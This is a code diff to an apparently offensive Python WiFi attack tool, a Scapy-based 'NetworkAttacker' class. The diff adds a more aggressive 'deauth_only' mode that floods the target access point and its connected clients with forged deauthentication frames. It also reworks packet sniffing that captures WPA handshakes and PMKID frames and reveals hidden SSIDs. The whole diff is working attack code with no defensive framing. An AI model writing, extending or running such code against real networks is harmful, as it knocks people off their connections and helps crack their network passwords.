@@ -31,15 +31,21 @@ class NetworkAttacker:
         
         self.threads = []
         self.deauth_event = threading.Event()
+        self.deauth_sent = 0
 
     def start_deauth_thread(self):
-        if self.attack_mode == "passive": return 
+        if self.attack_mode == "passive": 
+            return 
         
         self.deauth_event.clear()
+        
         if self.attack_mode == "pmkid":
             t = threading.Thread(target=self._pmkid_attack_loop, daemon=True)
+        elif self.attack_mode == "deauth_only":
+            t = threading.Thread(target=self._deauth_only_loop, daemon=True)  # Use aggressive loop
         else:
             t = threading.Thread(target=self._attack_loop, daemon=True)
+        
         t.start()
         self.threads.append(t)
 
@@ -75,25 +81,28 @@ class NetworkAttacker:
         try:
             pkt_deauth_bcast = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.target_bssid, addr3=self.target_bssid)/Dot11Deauth(reason=7)
             pkt_probe = RadioTap()/Dot11(addr1=self.target_bssid, addr2=self.interface_mac(), addr3=self.target_bssid)/Dot11ProbeReq()/Dot11Elt(ID="SSID", info="")
-    
+
             while not self.stop_attack:
                 if self.success and self.attack_mode == "reveal": break
                 if self.handshake_captured and self.attack_mode == "handshake": break
-    
+
                 try:
                     if self.clients:
                         # Convert to list to avoid runtime modification issues
                         current_clients = list(self.clients)
                         for client_mac, _ in current_clients:
-                             # 33:33 IPv6 multicast, ff:ff Broadcast
-                             if not client_mac.startswith(("33:33", "ff:ff", "01:00")):
+                            # 33:33 IPv6 multicast, ff:ff Broadcast
+                            if not client_mac.startswith(("33:33", "ff:ff", "01:00")):
                                 pkt_client = RadioTap()/Dot11(addr1=client_mac, addr2=self.target_bssid, addr3=self.target_bssid)/Dot11Deauth(reason=7)
                                 sendp(pkt_client, iface=self.interface, count=3, verbose=False)
+                                self.deauth_sent += 3  # Count packets sent
                                 time.sleep(0.05)
                     else:
                         sendp(pkt_deauth_bcast, iface=self.interface, count=2, verbose=False)
+                        self.deauth_sent += 2  # Count broadcast deauths
                     
-                    if self.attack_mode != "handshake":
+                    # Skip probe requests for deauth_only mode
+                    if self.attack_mode not in ["handshake", "deauth_only"]:
                         sendp(pkt_probe, iface=self.interface, count=1, verbose=False)
                 except OSError as e:
                     # Often happens if interface goes down
@@ -112,29 +121,19 @@ class NetworkAttacker:
             return "00:11:22:33:44:55"
 
     def sniffer_callback(self, pkt):
+        if self.stop_attack and self.attack_mode == "deauth_only": return
         if self.success and self.attack_mode == "reveal": return
-        if self.handshake_captured and self.attack_mode == "handshake": return
         if self.pmkid_captured and self.attack_mode == "pmkid": return
+        if self.handshake_captured and self.attack_mode == "handshake":
+             # If we captured handshake but don't have SSID yet, keep sniffing!
+             if self.target_ssid != "Unknown" and self.target_ssid != "<HIDDEN>":
+                 return
 
         try:
             if pkt.haslayer(Dot11):
                 addr1 = pkt.addr1.lower() if pkt.addr1 else ""
                 addr2 = pkt.addr2.lower() if pkt.addr2 else ""
                 
-                if pkt.type == 0 and pkt.subtype == 8: 
-                    if pkt.addr2.lower() == self.target_bssid:
-                        if self.best_beacon is None: self.best_beacon = pkt
-    
-                if self.attack_mode == "pmkid" and pkt.haslayer(EAPOL):
-                    if addr2 == self.target_bssid:
-                        self.eapol_packets.append(pkt)
-                        self.pmkid_captured = True
-                        self.handshake_captured = True 
-                        self.save_handshake(suffix="_PMKID")
-                        self.success = True
-                        self.stop_attack = True
-                        return
-    
                 client_mac = None
                 if self.target_bssid == addr1 and addr2 != "ff:ff:ff:ff:ff:ff" and not addr2.startswith("33:33"):
                     client_mac = addr2
@@ -148,9 +147,11 @@ class NetworkAttacker:
                     if not known:
                         vendor = get_vendor(client_mac)
                         self.clients.add((client_mac, vendor))
+                
+                if self.attack_mode == "deauth_only": return
     
-                if pkt.haslayer(EAPOL):
-                    if self.target_bssid in [addr1, addr2]:
+            if pkt.haslayer(EAPOL):
+                if self.target_bssid in [addr1, addr2]:
                         self.eapol_packets.append(pkt)
                         if len(self.eapol_packets) >= 4 and not self.handshake_captured:
                             self.save_handshake()
@@ -158,10 +159,11 @@ class NetworkAttacker:
                                 # Don't stop yet, verify first in save_handshake
                                 pass
     
-                # --- Reveal Logic ---
-                if self.target_ssid == "Unknown" or self.target_ssid == "<HIDDEN>" or self.attack_mode == "reveal":
-                    if pkt.type == 0 and (pkt.subtype == 5 or pkt.subtype == 8): 
-                        if self.target_bssid in [addr1, addr2, pkt.addr3]:
+            if self.target_ssid == "Unknown" or self.target_ssid == "<HIDDEN>" or self.attack_mode == "reveal":
+                # Check for Management frames (Type 0)
+                # Subtypes: 0 (Assoc Req), 2 (Reassoc Req), 4 (Probe Req), 5 (Probe Resp), 8 (Beacon)
+                if pkt.type == 0 and pkt.subtype in [0, 2, 4, 5, 8]: 
+                    if self.target_bssid in [addr1, addr2, pkt.addr3]:
                             if pkt.haslayer(Dot11Elt):
                                 try:
                                     elt = pkt.getlayer(Dot11Elt)
@@ -191,6 +193,40 @@ class NetworkAttacker:
         except Exception as e:
              # Scapy callback errors shouldn't crash main loop
              pass
+    
+    def _deauth_only_loop(self):
+        """More aggressive deauth loop for deauth_only mode"""
+        try:
+            # Broadcast deauth
+            pkt_bcast = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", 
+                                        addr2=self.target_bssid, 
+                                        addr3=self.target_bssid)/Dot11Deauth(reason=7)
+            
+            while not self.stop_attack:
+                try:
+                    # Send broadcast deauth
+                    sendp(pkt_bcast, iface=self.interface, count=5, verbose=False)
+                    self.deauth_sent += 5
+                    
+                    # Send deauth to each client
+                    current_clients = list(self.clients)
+                    for client_mac, _ in current_clients:
+                        if not client_mac.startswith(("33:33", "ff:ff", "01:00")):
+                            pkt_client = RadioTap()/Dot11(addr1=client_mac, 
+                                                        addr2=self.target_bssid, 
+                                                        addr3=self.target_bssid)/Dot11Deauth(reason=7)
+                            sendp(pkt_client, iface=self.interface, count=3, verbose=False)
+                            self.deauth_sent += 3
+                    
+                    # Shorter delay for more aggressive attack
+                    time.sleep(0.5)
+                    
+                except Exception as e:
+                    logger.debug(f"Deauth loop error: {e}")
+                    time.sleep(1)
+                    
+        except Exception as e:
+            logger.error(f"Deauth-only thread crash: {e}")
 
     def save_handshake(self, suffix=""):
         # 1. Prepare filename
